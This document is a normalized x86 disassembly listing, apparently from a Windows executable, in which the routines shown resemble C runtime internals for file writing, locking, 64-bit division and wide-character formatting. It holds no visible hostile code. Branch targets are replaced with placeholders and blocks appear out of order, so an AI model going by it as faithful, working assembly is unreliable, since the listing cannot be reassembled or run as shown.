cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_408d49
push 0x10
push r--data
call sub_405df0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405bf4
and [ eax ] 0x0
call sub_405be1
mov [ eax ] 0x9
call sub_405bf4
and [ eax ] 0x0
call sub_405be1
mov [ eax ] 0x9
call sub_40571b
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_405e35
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40ae16
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405be1
mov [ eax ] 0x9
call sub_405bf4
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_40864c
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408e15
mov eax [ ebp - 0x1c ]
sub_408e1d
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_4070db
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_408e66
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_405be1
mov [ eax ] 0x9
call sub_405be1
mov [ eax ] 0x9
call sub_40571b
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_408ec2
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_407120
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_407120
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_408f93
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_4052f1
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_408fd4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_4052f1
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_409006
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_405218
pop ecx
pop ebp
retn
sub_409042
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_405218
pop ecx
pop ebp
retn
sub_409071
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_405be1
mov [ eax ] 0x16
call sub_40571b
or eax 0xffffffff
pop ebp
retn
sub_409097
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_409071
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_40b17a
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_409071
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_404645
leave
retn
push esi
call sub_409071
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_409071
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_409071
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_409071
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_409071
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_409071
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_409071
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_409071
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40b443
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_409071
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_409071
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_4063e8
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_409234
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40654c
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_409364
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_405be1
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_409364
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40654c
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4093b0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_409445
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_409097
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_409474
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx ecx
call sub_405be1
test [ edi + 0xc ] 0x40
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_405be1
and [ eax ] 0x0
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test ebx ebx
jg r-xdata
add [ esi ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
mov eax edi
dec ebx
call sub_409445
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
call sub_405be1
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
leave
retn
call sub_405be1
cmp [ eax ] 0x2a
jne r-xdata
call sub_405be1
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
push 0x3f
mov eax edi
call sub_409445
pop ecx
sub_4094ed
mov edi edi
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x44c ]
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x428 ] eax
call sub_40654c
test esi esi
jne r-xdata
xor eax eax
cmp ebx eax
je r-xdata
call sub_405be1
mov [ eax ] 0x16
call sub_40571b
cmp [ ebp - 0x440 ] 0x0
je r-xdata
movzx ecx [ ebx ]
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x43c ] eax
mov [ ebp - 0x458 ] eax
mov [ ebp - 0x420 ] ecx
cmp cx ax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x440 ] 0x0
je r-xdata
push 0x2
pop esi
add ebx esi
xor eax eax
mov [ ebp - 0x45c ] ebx
cmp [ ebp - 0x41c ] eax
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_404645
leave
retn
mov eax [ ebp - 0x41c ]
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x43c ] 0x0
je r-xdata
lea edx [ ecx - 0x20 ]
cmp dx 0x58
ja r-xdata
cmp [ ebp - 0x43c ] 0x7
jne r-xdata
mov edx [ ebp - 0x43c ]
imul eax eax 0x9
movzx eax [ eax + edx + r--data ]
push 0x8
shr eax 0x4
pop edx
mov [ ebp - 0x43c ] eax
cmp eax edx
je r-xdata
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
cmp eax 0x7
ja r-xdata
mov ebx [ ebp - 0x45c ]
mov edi [ ebp - 0x418 ]
jmp [ eax * 4 + jump_table_40a081 ]
mov ecx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x428 ] eax
jmp r-xdata
movzx eax cx
sub eax 0x20
je r-xdata
cmp cx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp cx 0x2a
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x42c ]
push ecx
lea esi [ ebp - 0x41c ]
mov [ ebp - 0x428 ] 0x1
call sub_409445
pop ecx
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x420 ] eax
test ax ax
je r-xdata
or [ ebp - 0x408 ] esi
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x430 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x40c ] eax
test eax eax
jns r-xdata
movzx eax [ ebx ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax edx
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ ebx + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax esi
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ ebx + 0x2 ] 0x32
jne r-xdata
add ebx 0x4
or [ ebp - 0x408 ] 0x8000
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
cmp [ ebp - 0x40c ] 0xffffffff
mov ebx 0x7fffffff
je r-xdata
sub eax esi
je r-xdata
mov [ ebp - 0x40c ] edx
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi edx
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add ebx 0x4
and [ ebp - 0x408 ] 0xffff7fff
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add ebx esi
or [ ebp - 0x408 ] 0x1000
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x418 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx [ ebp - 0x40c ]
mov [ ebp - 0x420 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] 0x10
je r-xdata
cmp [ ebp - 0x450 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x454 ] 0x7
jmp r-xdata
sub eax esi
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] edx
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x454 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x438 ] ax
mov eax [ ebp - 0x454 ]
add eax 0x51
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x424 ] esi
jmp r-xdata
cmp [ ebp - 0x458 ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea edi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] edi
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x418 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
or [ ebp - 0x408 ] 0x20
add ecx 0x20
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x420 ] ecx
sub eax esi
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x458 ]
call sub_404a59
and [ ebp - 0x458 ] 0x0
pop ecx
mov ebx [ ebp - 0x430 ]
sub ebx [ ebp - 0x414 ]
sub ebx [ ebp - 0x424 ]
test [ ebp - 0x408 ] 0xc
mov [ ebp - 0x468 ] ebx
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax esi
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax esi
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
mov edi [ ebp - 0x42c ]
mov ecx [ ebp - 0x424 ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x41c ]
call sub_409474
test [ ebp - 0x408 ] 0x8
pop ecx
je r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp cx 0x67
jne r-xdata
mov eax [ ebp - 0x418 ]
mov edx [ eax ]
add eax 0x8
mov esi [ DecodePointer@IAT ]
mov [ ebp - 0x418 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x470 ] eax
lea eax [ ebp - 0x44c ]
push eax
push [ ebp - 0x460 ]
movsx eax cl
push [ ebp - 0x40c ]
mov [ ebp - 0x474 ] edx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x474 ]
push edi
push eax
push [ rw-data ]
call esi
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
call sub_40921e
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x428 ] esi
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x464 ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax esi
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x44c ]
movzx eax al
push ecx
push eax
call sub_409364
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x428 ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
mov eax [ ebp - 0x42c ]
push 0x20
lea esi [ ebp - 0x41c ]
dec edi
call sub_409445
cmp [ ebp - 0x41c ] 0xffffffff
pop ecx
je r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x424 ] 0x1
mov ebx 0xa3
cmp [ ebp - 0x40c ] ebx
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x420 ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] edx
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x428 ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x434 ] al
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
mov [ ebp - 0x433 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_409234
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x43c ] 0x0
add eax esi
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x410 ]
mov edi [ ebp - 0x42c ]
mov ecx [ ebp - 0x414 ]
lea eax [ ebp - 0x41c ]
call sub_409474
pop ecx
cmp [ ebp - 0x414 ] 0x0
jle r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test edi edi
jg r-xdata
push 0x20
mov ecx [ ebp - 0x420 ]
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_4070db
pop ecx
mov ecx [ ebp - 0x420 ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x44c ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x41c ]
mov [ esi ] eax
mov ax [ ebp - 0x41c ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x424 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x450 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
mov ebx [ ebp - 0x414 ]
mov eax [ ebp - 0x42c ]
push 0x30
lea esi [ ebp - 0x41c ]
dec edi
call sub_409445
cmp [ ebp - 0x41c ] 0xffffffff
pop ecx
je r-xdata
mov [ ebp - 0x40c ] ebx
jmp r-xdata
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov edi eax
jmp r-xdata
push edi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc edi
mov [ ebp - 0x410 ] edi
lea eax [ ebp - 0x44c ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x420 ]
cdq
push edx
push eax
push ebx
push edi
call sub_4093b0
add ecx 0x30
mov [ ebp - 0x468 ] ebx
mov edi eax
mov ebx edx
cmp ecx 0x39
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
mov edi [ ebp - 0x468 ]
jmp r-xdata
or [ ebp - 0x41c ] 0xffffffff
jmp r-xdata
push [ ebp - 0x464 ]
mov eax [ ebp - 0x42c ]
lea esi [ ebp - 0x41c ]
call sub_409445
add edi [ ebp - 0x420 ]
pop ecx
test ebx ebx
jg r-xdata
test edi edi
jg r-xdata
call sub_407050
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x41c ] 0x0
jl r-xdata
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0xac ]
lea eax [ ebp - 0x464 ]
push edi
push eax
dec ebx
call sub_409234
add esp 0x10
mov [ ebp - 0x420 ] eax
test eax eax
